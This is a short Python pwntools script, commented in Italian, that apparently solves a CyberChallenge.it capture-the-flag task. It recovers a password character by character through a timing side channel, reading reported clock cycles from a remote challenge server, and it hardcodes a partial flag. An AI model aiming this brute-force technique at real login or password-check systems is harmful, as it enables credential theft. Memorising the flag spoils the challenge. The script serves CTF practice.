from pwn import *
import string

# Configura pwntools
context.log_level = 'error'  # Rendi l'output più pulito

# Caratteri da provare
charset = string.ascii_letters + string.digits + "_{}"

# Configura il target (modifica se è remoto o un altro path)
def connect():
    return remote("benchmark.challs.cyberchallenge.it",9031)  # cambia qui se è remoto (es: remote('host', port))

# Estrai i clock cycles dalla risposta
def get_cycles(resp):
    for line in resp.splitlines():
        if b'clock cycles' in line:
            return int(line.split()[-3])
    return 0

# Attacco password
known = "CCIT{s1d3_ch4nn"

for i in range(32):  # max lunghezza stimata della password
    best = ("", 0)

    for c in charset:
        attempt = known + c
        io = connect()
        io.recvuntil(b"password to check:\n")  # attesa prompt
        io.sendline(attempt.encode())
        out = io.recvall(timeout=0.2)
        io.close()

        cycles = get_cycles(out)
        print(f"Trying '{attempt}': {cycles} cycles")

        if cycles > best[1]:
            best = (c, cycles)

    known += best[0]
    print(f"[+] Password so far: {known!r}")

    # Facoltativo: esci se ricevi la flag
    if "flag" in known.lower():
        break
